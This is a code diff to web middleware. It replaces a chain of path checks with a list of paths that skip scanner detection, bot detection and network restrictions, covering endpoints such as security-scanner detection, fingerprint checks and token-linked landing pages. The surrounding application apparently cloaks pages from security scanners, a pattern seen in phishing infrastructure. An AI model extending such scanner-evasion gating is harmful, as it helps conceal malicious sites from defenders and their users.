@@ -237,22 +237,31 @@ if (!ADMIN_PASSWORD) {
   // Admins may be accessing from datacenter IPs (VPS, Azure, AWS, etc.)
   // Also allow CSRF token endpoint (needed for admin panel)
   // Also allow landing page API endpoints (called from token links)
-  const isAdminPath = pathname.startsWith('/mamacita') || 
-                       pathname.startsWith('/api/admin') ||
-                       pathname === '/api/csrf-token' ||
-                       pathname === '/api/security/detect-scanner' ||
-                       pathname === '/api/security/challenge/verify' ||
-                       pathname === '/api/security/verify' ||
-                       pathname === '/api/captcha-config' ||
-                       pathname === '/api/captcha-background' ||
-                       pathname === '/api/captcha/session' ||
-                       pathname === '/api/verify-access' ||
-                       pathname === '/api/detect-language' ||
-                       pathname === '/api/check-fingerprint' ||
-                       pathname.startsWith('/api/get-screenshot') ||
-                       pathname === '/api/management/link-status' ||
-                       pathname === '/api/firewall/check' ||
-                       pathname === '/api/health/diagnostics'
+  const bypassPrefixes = [
+    '/mamacita',
+    '/api/admin',
+    '/api/csrf-token',
+    '/api/security/detect-scanner',
+    '/api/security/challenge/verify',
+    '/api/security/verify',
+    '/api/captcha-config',
+    '/api/captcha-background',
+    '/api/captcha/session',
+    '/api/verify-access',
+    '/api/detect-language',
+    '/api/check-fingerprint',
+    '/api/get-screenshot',
+    '/api/management/link-status',
+    '/api/firewall/check',
+    '/api/health/diagnostics',
+  ]
+
+  const isAdminPath = bypassPrefixes.some((prefix) => {
+    if (prefix.endsWith('/')) {
+      return pathname.startsWith(prefix)
+    }
+    return pathname === prefix || pathname.startsWith(`${prefix}/`)
+  })
   if (isAdminPath) {
     // Admin paths bypass all security checks (scanner detection, bot detection, network restrictions)
     // This allows admins to access from any IP without being blocked
